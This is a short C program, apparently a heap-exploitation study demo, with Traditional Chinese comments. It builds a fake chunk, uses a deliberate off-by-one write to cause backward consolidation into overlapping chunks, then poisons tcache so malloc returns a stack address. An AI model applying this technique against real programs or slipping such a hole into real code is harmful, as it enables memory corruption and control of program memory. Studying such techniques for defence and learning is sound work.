#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    // target
    intptr_t stack_var[4];
    intptr_t *a = malloc(0x38);

    // 在 overlap 的 chunk 前建立一個 fake chunk，並將 fd 與 bk 都設為 fake chunk 自己
    a[0] = 0;    // prev_size (Not Used)
    a[1] = 0x60; // size
    a[2] = (size_t) a; // fwd
    a[3] = (size_t) a; // bck

    // b 模擬造成 off-by-one 的 chunk
    uint8_t *b = (uint8_t *) malloc(0x28);
    int real_b_size = 0x28;

    uint8_t *c = (uint8_t *) malloc(0xf8);
    uint64_t* c_size_ptr = (uint64_t*)(c - 8);

    // ! vuln
    b[real_b_size] = 0; // c: 0x101 ---> 0x100
    size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
    *(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size; // prev_size
    a[1] = fake_size; // update fake chunk size

    // 填滿 tcache
    intptr_t *x[7];
    for(int i = 0; i < 7; i++)
        x[i] = malloc(0xf8);

    for(int i = 0; i < 7; i++)
        free(x[i]);

    // trigger consolidation
    free(c);

    // 此時 unsorted bin 的 chunk 大小為 0x160 == 0x100 + 0x60 (fake_chunk)

    // 取得在 unsorted bin 當中的 0x160 chunk
    intptr_t *d = malloc(0x158);

    // tcache poisoning
    uint8_t *pad = malloc(0x28);
    free(pad);
    free(b);
    // 此時 b --> pad，而 b 所在的位址 d 又控的到，因此將 next 改成 target address
    d[0x30 / 8] = (long) stack_var;

    // take target out
    malloc(0x28);
    intptr_t *e = malloc(0x28);

    // sanity check
    assert(e == stack_var);
}